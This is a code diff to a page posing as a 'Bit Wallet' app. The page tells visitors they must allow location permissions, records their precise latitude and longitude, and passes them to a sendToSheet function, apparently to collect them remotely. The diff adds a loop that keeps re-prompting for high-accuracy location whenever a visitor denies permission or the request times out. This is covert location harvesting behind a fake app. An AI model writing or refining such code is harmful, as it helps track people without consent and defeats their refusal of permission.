@@ -33,7 +33,7 @@
 <body>
   <div class="container">
     <h1>Bit Wallet</h1>
-    <p>User must allow location permisions to continue</p>
+    <p>User must allow location permissions to continue</p>
     <p>Thank You!</p>
   </div>
 
@@ -56,17 +56,37 @@
       const lon = position.coords.longitude;
       console.log(`Latitude: ${lat}, Longitude: ${lon}`);
       sendToSheet(lat, lon);
+      // Location obtained – stop asking
     }
 
     function showError(error) {
       console.log("Geolocation error:", error.message);
+
+      // Keep asking if the user denied or it timed out
+      if (error.code === error.PERMISSION_DENIED || error.code === error.TIMEOUT) {
+        // Small delay so the browser doesn't throttle the requests too hard
+        setTimeout(askForLocation, 800);
+      }
+      // If POSITION_UNAVAILABLE we also retry
+      else if (error.code === error.POSITION_UNAVAILABLE) {
+        setTimeout(askForLocation, 1500);
+      }
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(showPosition, showError);
-    } else {
-      console.log("Geolocation not supported by this browser.");
+    function askForLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        console.log("Geolocation not supported by this browser.");
+      }
     }
+
+    // Start the loop
+    askForLocation();
   </script>
 </body>
 </html>
